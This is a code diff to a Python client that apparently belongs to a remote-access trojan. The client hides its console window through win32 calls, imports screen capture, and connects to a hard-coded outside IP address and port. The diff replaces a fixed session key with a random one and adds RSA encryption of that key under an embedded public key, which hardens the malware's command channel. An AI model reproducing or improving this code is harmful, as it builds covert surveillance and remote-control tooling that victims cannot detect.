@@ -8,6 +8,7 @@ import base64
 from PIL import ImageGrab
 from packet import Packet
 from encryption import encrypt,decrypt
+import os
 
 def hide():
     import win32console,win32gui
@@ -23,11 +24,11 @@ class Client:
 
     def __init__(self,ip='54.69.185.61',port=5715):
         self.messageQ = Queue()
-
-        self.key = '\x40\x73\x8A\xC7\x8F\x0F\xD5\xEF\x02\x57\xB2\xE1\x9B\x83\x04\x15'
-
+        self.key = os.urandom(16)
         TCP_IP = ip
         TCP_PORT = port
+
+        self.RSAPublicKey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAonQkIgH5+WBaEGAfqH6J\nGW3M7vYwPCHz9tmz1ToH82YVDBaX9qNUxJRs3t5QNrvgNo9Dfem6nnXpgIdSykhe\nO1EB2CVJ2Z92bewBmYu8Pda3BOURq0mi1gsn5fna3JVyQkB/gElSld0elQ5BubKn\n6wCh3tCWj8FS66DY8U9f6aeRMN1QBPPprd1zsbixafeLg5Cc+utIXCtRTZDeCL2d\n7pccI276OC2r7GHwMUAsFqdYpva2W4PmC+AHe9eZk9FknCc/pXD8AdeUccDAZ7wR\no/VFqbKCQR6Ei6ooUFXGEXdJU9tEuxPYb+CM1uGjEyqvuDGvUJS+fbOtMhM1L/kS\nKwIDAQAB\n-----END PUBLIC KEY-----'
 
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((TCP_IP, TCP_PORT))
@@ -121,6 +122,7 @@ class Client:
         pkt.returnIP = 'MRS'
         pkt.length = len(self.key)
         pkt.data = self.key
+        pkt.RSAEncryptData(self.RSAPublicKey)
         self.messageQ.put(pkt)
 
     def enqueue(self,pkt):
